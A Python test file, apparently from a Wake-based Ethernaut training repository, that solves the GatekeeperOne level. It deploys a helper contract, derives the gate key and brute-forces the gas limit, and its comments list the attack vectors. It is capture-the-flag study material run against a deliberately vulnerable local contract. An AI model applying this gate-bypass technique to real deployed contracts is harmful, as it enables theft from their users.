from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv13_gatekeeper_one import GatekeeperOne
from pytypes.contracts.attacker.lv13_key_generator import GatekeeperOneHelper 

@default_chain.connect()
def test_lv13():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv13()
    exploit_lv13(contract, ethernaut.attacker)
    ethernaut.check_lv13(contract)

def exploit_lv13(contract: GatekeeperOne, attacker: Account):
    # Attack vector: 
    # Training:
     
    # Attack vector - gate 1: tx.origin is not changed in redirect => helper contract can be used
    # Attack vector - gate 2: required amount of gas can be obtained by bruteforcing
    # Attack vector - gate 3: key can be generated by helper contract
    # Training: know what attacker can have under his controll and what he cant 
      
    helper = GatekeeperOneHelper.deploy()
    key = bytes8(helper.getGateThreeKey())
    helper.testGateThree(key)
    
    for gas_residue in range(8192):
        gas = 50_000 + gas_residue
        with may_revert():
            gates_passed = helper.callEnterOn(contract, key, type=0, gas_limit=gas)
            if gates_passed:
                print(f"Gas used to pass: {gas} gas")
                break
